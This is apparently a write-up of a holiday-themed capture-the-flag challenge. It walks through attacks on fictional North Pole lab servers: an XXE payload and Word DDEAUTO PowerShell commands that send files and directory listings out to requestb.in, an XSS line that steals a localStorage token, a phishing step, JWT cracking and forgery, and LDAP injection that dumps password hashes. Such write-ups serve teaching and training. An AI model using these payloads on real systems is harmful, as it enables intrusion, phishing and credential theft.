Our next target is the SMB server. According to the NMAP scan its address is 10.142.0.7. Let's map the SMB port using SSH tunneling technique and the Alabaster Snowball's password that we now know:

```
$ ssh -L :445:10.142.0.7:445 alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s.northpolechristmastown.com's password: 
```

We can use ```smbclient``` utility to query the SMB server:

```
$ smbclient -L localhost -U alabaster_snowball
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	FileStor        Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to localhost failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

The file share that we are looking for is FileStor (others are standard shares). Let's download the files from it:

```
$ smbclient -U alabaster_snowball '\\localhost\FileStor' stream_unhappy_buy_loss
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Dec  6 16:51:46 2017
  ..                                  D        0  Wed Dec  6 16:51:46 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017

		13106687 blocks of size 4096. 9626135 blocks available
smb: \> mget *
Get file BOLO - Munchkin Mole Report.docx? y
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (251.8 KiloBytes/sec) (average 251.8 KiloBytes/sec)
Get file GreatBookPage3.pdf? y
getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (1134.7 KiloBytes/sec) (average 715.8 KiloBytes/sec)
Get file MEMO - Calculator Access for Wunorse.docx? y
getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (187.0 KiloBytes/sec) (average 600.3 KiloBytes/sec)
Get file MEMO - Password Policy Reminder.docx? y
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (232.0 KiloBytes/sec) (average 536.4 KiloBytes/sec)
Get file Naughty and Nice List.csv? y
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (23.1 KiloBytes/sec) (average 475.7 KiloBytes/sec)
Get file Naughty and Nice List.docx? y
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (112.9 KiloBytes/sec) (average 430.5 KiloBytes/sec)
smb: \> exit
```

We will save the documents that we found - the information found in them will be useful in future challenges. Here's the answer to the 
third challenge question:

> Q: 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?
>
> A: FileStor

![ewa]({{ site.baseurl }}/images/sans2017/ewa.png)

#### Elf Web Access (EWA)

EWA server is located at address 10.142.0.5. Let's set up a connection to it:

```
ssh -L :80:10.142.0.5:80 alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s.northpolechristmastown.com's password: 
alabaster_snowball@l2s:/tmp/asnow.VtfyW06sWV9K70MSMzOwd9G3$ 
```

Since it's a web application it will be important to properly map the site name to the localhost (because the remote web server is tunneled through local port 80). This can be achieved by adding the following line to ```/etc/hosts```:

```
127.0.0.1	mail.northpolechristmastown.com
```

Web site file ```/robots.txt``` references file ```cookies.txt```, which, in turn, describes the cookie encryption algorithm. From that algorithm and the related hints it becomes clear that if we use a 16-byte random value as the encrypted password the login algorithm will let us in.

We will use 16 letters ```A``` (base64-encoded) and set up a cookie to make the mail server think we are already logged in:

```
Cookie: EWA={"name":"Alabaster.Snowball@northpolechristmastown.com",
"plaintext":"","ciphertext":"QUFBQUFBQUFBQUFBQUFBQQ"}	
```

Once we are in we can browse the e-mails in the mailbox and read the page 4 of the Great Book. Mail access will also be useful in future challenges.

> Q: 4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?
>
> A: Page 4 describes the rise of the Lollipop Guild, the elite force of Munchkins that are defending the Oz against the Elves and also conduct offensive operations against them.

![nppd]({{ site.baseurl }}/images/sans2017/nppd.png)

#### North Pole Police Department (NPPD)

NPPD has a web site that lists infractions for the members of the public. Also, one of the files that we took from the SMB server was a Naughty and Nice list. Let's correlate the two to determine what it takes to land on the Naughty list.

The following script will scrape data for each person from the site and will list the number of infractions next to it: 

```python
import json
import urllib2
import urllib

	
elfs = open("Naughty and Nice List.csv","r").readlines()

for elf in elfs:
	(name,status) = elf.strip().split(",")
	addr = 'https://nppd.northpolechristmastown.com/infractions?json=1&'
+urllib.urlencode({'query':name})
	response = urllib2.urlopen(addr).read()
	data = json.loads(response)
	print "%s,%s,%d" % (name,status,data['count'])
```

The resulting output can be dumped in a CSV file, and sorted by infraction count in Excel. The result shows that 4 infractions is the cutoff point:

![infractions]({{ site.baseurl }}/images/sans2017/infractions.png)

One of the challenge requirements is to list at least 6 munchkin moles. However it is less clear what to consider a defining criteria for determining who is a mole. The Munchkin Mole Report lists 2 moles - Boq Questrian and Bini Aru. When we correlate that information to what is listed in NPPD database we can see that the only common fact about the two known moles is their "atomic wedgies" infractions. All other analysis does not seem to get us additional information - tweets and hints primarily emphasize JSON analysis, robots.txt does not reference anything interesting, various combinations of search criteria do not reveal new information, and we are preventing from exploiting the site. 

At this point I decided to select "atomic wedgies" as the criteria for selecting the moles. Search for "wedgies" brings back 20 entries and 18 unique names: Boq Questrian, Bini Aru, Nate Bowers, Ron Oneill, Lina Koch, Wesley Morton, Chloe Allen, Ernest Gillespie, Nina Fitzgerald, Jason Santos, Kirsty Evans, Lance Montoya, Belinda Vargas, Asif Waters, Betsy Carr, Tracey Rowe, Kat George, and Erin Tran.

> Q: 5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
>
> A: 4 infractions will land you on the Naughty list. I believe the munchkin moles are: Boq Questrian, Bini Aru, Nate Bowers, Ron Oneill, Lina Koch, Wesley Morton, Chloe Allen, Ernest Gillespie, Nina Fitzgerald, Jason Santos, Kirsty Evans, Lance Montoya, Belinda Vargas, Asif Waters, Betsy Carr, Tracey Rowe, Kat George, and Erin Tran. The Abominable Snow Monster is the one throwing snowballs, as one of the chat transcripts informs us ("You've done it! You found out who was throwing the giant snowballs! It was the Abominable Snow Monster"). It is also mentioned on page 5 of the Great Book.

![eaas]({{ site.baseurl }}/images/sans2017/eaas.png)

#### Elf as a Service (EaaS)

EaaS server is located at address 10.142.0.13. We will set up the usual SSH tunnel and hosts file mapping to access it.

Upon further examination it becomes clear that the site is vulnerable to XXE.

We can set up our ```evil.dtd``` DTD on an external site (like http://ix.io/) with the following content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 
'https://requestb.in/10mqw8w1?%stolendata;'>">
```

Let's submit an XML that references this DTD:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Elf [
    <!ELEMENT Elf ANY >
    <!ENTITY % extentity SYSTEM "http://ix.io/Dex">
    %extentity;
    %inception;
    %sendit;
    ]
>
<Elf><Elf><ElfID>1</ElfID><ElfName>Elf On a Shelf</ElfName>
<Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase>
<Picture>1.png</Picture><Address>On a Shelf, Obviously</Address></Elf>
...
</Elf>
```

The vulnerable XML parser will down our evil DTD and, in turn, exfiltrate file c:\greatbook.txt to the external server. The file contents turn out to be the full address of the Page 6 of the Great Book:

```
http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf
```

The answer to the challenge question:

> Q: 6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?
>
> A: "The Dreaded Inter-Dimensional Tornadoes"

![emi]({{ site.baseurl }}/images/sans2017/emi.png)

#### Elf-Machine Interfaces (EMI)

As hints suggest, EMI machine can be exploited through a DDE vulnerability in MS Word. 

> Note that this vulnerability was fixed in a MS Office update (just in time for HHC!), so make sure you read https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021 before trying to reproduce it on your own machine.

We will use ```MEMO - Calculator Access for Wunorse.docx``` as our starting point for this attack. In the document we will set up the following command:

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell.exe -c 
(New-Object System.Net.WebClient).DownloadString
('https://requestb.in/qfa38mqf?'+(dir c:\\))"}
```

We will then send the document containing the command to Alabaster Snowball using our EWA access (we can change the cookie to impersonate Shinny Upatree). Note that the e-mail must contain reference to "gingerbread cookie recipe".

After a little while the vulnerability will be triggered on the server and we will get the following directory listing exfiltrated:

```
inetpub
Logs
Microsoft
PerfLogs
Program Files
Program Files (x86)
python
Users
Windows
GreatBookPage7.pdf 
```

Now we can calculate the SHA1 hash of ```GreatBookPage7.pdf``` by sending another command in a document:

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell.exe -c 
(New-Object System.Net.WebClient).DownloadString
('https://requestb.in/qfa38mqf?'+(Get-FileHash 
C:\\GreatBookPage7.pdf -Algorithm SHA1))"}
```

The extracted data contains the hash that we can use to unlock the book page:

```
@{Algorithm=SHA1; Hash=C1DF4DBC96A58B48A9F235A1CA89352F865AF8B8; 
Path=C:\GreatBookPage7.pdf} 
```

The answer to the seventh challenge question:

> Q: 7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
>
> A: The page describes the Witches of Oz. They remained neutral in the war between Elves and Munchkins, and were never sighted in the North Pole.

![edb]({{ site.baseurl }}/images/sans2017/edb.png)

#### North Pole Elf Database (EDB)

For this challenge we will set up a tunnel to EDB (10.142.0.6) and an entry for it in the hosts file just like we did for other systems. Based on the recon and the hints it seems that we need to use XSS to exploit this system. 

As we inspect the site JavaScript we can see that it is using browser local storage for storing an authentication token ```np-auth```.

First, let's use XSS to steal Alabaster's token. The following XSS, when submitted to the site, gets the token exfiltrated:

```javascript
<img src=x onerror="var o=new XMLHttpRequest();o.open('GET',
'https://requestb.in/qfa38mqf?'+(localStorage.getItem('np-auth')));o.send();">
```

The result is a JWT token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
```
 
When we open it in [JWT Editor](https://jwt.io/) we can see the payload. 

```json
{
  "dept": "Engineering",
  "ou": "elf",
  "expires": "2017-08-16 12:00:47.248093+00:00",
  "uid": "alabaster.snowball"
}
```

The token is expired. We need to update it (e.g. by bumping up the year). In order to do it let's first crack its encryption key:

```
$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
Secret is "3lv3s"
```

Once we re-encrypt the updated token we can substitute it in the response to get it stored in our browser's local storage. To do that we can an HTTP proxy to dynamically replace the login error message...:

```
{"bool":false,"message":"Incorrect username or password!","token":""}
```

...with the following data:

```
{"bool": true,"link":"/home.html",
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.gr2b8plsmw_JCKbomOUR-E7jLiSMeQ-evyYjcxCPXco"}
```

Once this is done we can bypass the login prompt and go to the Elf Database.

Based on the hints the database is performing lookups using LDAP. Recon of the site also finds an LDAP schema description referenced from ```robots.txt```. 

In addition to elves and reindeer the schema also refers to humans. Yet the database does not allow searches for humans, which is suspicious. Let's try to find humans in EDB.

We can inject expression ```a*)(ou=human))(&(gn=*x``` into the query, and also specify all possible fields that we want returned. The following is the full request that we will submit:

```
name=a*)(ou%3Dhuman))(%26(gn%3D*x&isElf=True&attributes=dn%2CobjectClass
%2Ccn%2Csn%2Cgn%2CprofilePath%2Cuid%2Cou%2Cdepartment%2Cmail%2C
telephoneNumber%2Cstreet%2CpostOfficeBox%2CpostalCode%2CpostalAddress%2C
st%2Cl%2Cc%2CfacsimileTelephoneNumber%2Cdescription%2CuserPassword
```

It brings back the data for Santa and Mrs. Claus:

```json
[[["cn=jessica,ou=human,dc=northpolechristmastown,dc=com",{"c":["US"],
"cn":["jessica"],"department":["administrators"],"description":["Mrs. 
Claus is the wife of Santa Claus and is the primary administrator and 
care-taker of the elves. As such, she is highly admired amongst the elf 
kind."],"facsimileTelephoneNumber":["123-456-8893"],"gn":["Jessica"],
"l":["North Pole"],"mail":["jessica.claus@northpolechristmastown.com"],
"objectClass":["addressbookPerson"],"ou":["human"],"postOfficeBox":["126"],
"postalAddress":["Candy Street"],"postalCode":["543210"],"profilePath":
["/img/elves/mrsclause.png"],"sn":["Claus"],"st":["AK"],"street":
["Santa Claus Lane"],"telephoneNumber":["123-456-7893"],"uid":
["jessica.claus"],"userPassword":["16268da802de6a2efe9c672ca79a7071"]}]],
[["cn=santa,ou=human,dc=northpolechristmastown,dc=com",{"c":["US"],
"cn":["santa"],"department":["administrators"],"description":
["A round, white-bearded, jolly old man in a red suit, who lives at the 
North Pole, makes toys for children, and distributes gifts at 
Christmastime. AKA - The Boss!"],"facsimileTelephoneNumber":
["123-456-8893"],"gn":["Santa"],"l":["North Pole"],"mail":
["santa.claus@northpolechristmastown.com"],"objectClass":
["addressbookPerson"],"ou":["human"],"postOfficeBox":["126"],
"postalAddress":["Candy Street"],"postalCode":["543210"],"profilePath":
["/img/elves/santa.png"],"sn":["Claus"],"st":["AK"],"street":
["Santa Claus Lane"],"telephoneNumber":["123-456-7893"],"uid":
["santa.claus"],"userPassword":["d8b4c05a35b0513f302a85c409b4aab3"]}]]]
```

Of particular interest is Santa's password hash. Google search brings a single hit for it at https://hashhack.pro/dict.php?block=d8b4:

```
d8b4c05a35b0513f302a85c409b4aab3:001cookielips001
```

Now, armed with the username/password combination of ```santa.claus/001cookielips001```, we can log into EDB as him and read the letter from the Wizard of Oz:

![wizard]({{ site.baseurl }}/images/sans2017/wizard.png)

Answer to the eighth challenge question: 

> Q: 8) Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?
>
> A: Wizard of Oz


For the last challenge question we can find the information in the second chat that is added to our Stocking:

> Q: 9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?
> 
> A: Glinda the Good Witch of Oz. In her own words: "I cast a magic spell on the Abominable Snow Monster to make him throw all the snowballs at the North Pole. Why? Because I knew a giant snowball fight would stir up hostilities between the Elves and the Munchkins, resulting in all-out WAR between Oz and the North Pole. I was going to sell my magic and spells to both sides. War profiteering would mean GREAT business for me." 

That's all folks! :smile:

_Big thanks to the Counter Hack Team for this very fun and educational experience!_



